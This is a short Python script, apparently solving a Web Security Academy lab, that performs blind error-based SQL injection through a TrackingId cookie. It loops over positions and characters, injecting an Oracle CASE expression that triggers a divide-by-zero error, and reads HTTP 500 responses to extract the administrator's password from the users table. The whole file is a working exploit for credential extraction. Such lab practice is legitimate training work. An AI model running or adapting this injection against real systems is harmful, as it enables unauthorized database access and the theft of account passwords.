import string
import requests

dictionary = string.ascii_lowercase + string.digits

url = "https://0ae70015036be135850acc03003400c1.web-security-academy.net/"


def make_request(url):
    password = ''

    for position in range(1, 21):
        for character in dictionary:

            cookies = {
                "TrackingId": "Kq2s1aW85HBx1IDs'||(SELECT CASE WHEN substr(password,%d,1)='%s' THEN TO_CHAR(1/0) ELSE "
                              "NULL END FROM users where username='administrator')||'" % (
                                  position, character),
                "session": "vDa0uPTyhMpsLC4Y78fdnb5UFC4vF83h"
            }

            response = requests.get(url, cookies=cookies)

            if response.status_code == 500:
                password += character
                print("Found password character: {0} | password atm: {1}".format(character, password))

    return password


if __name__ == '__main__':
    make_request(url)
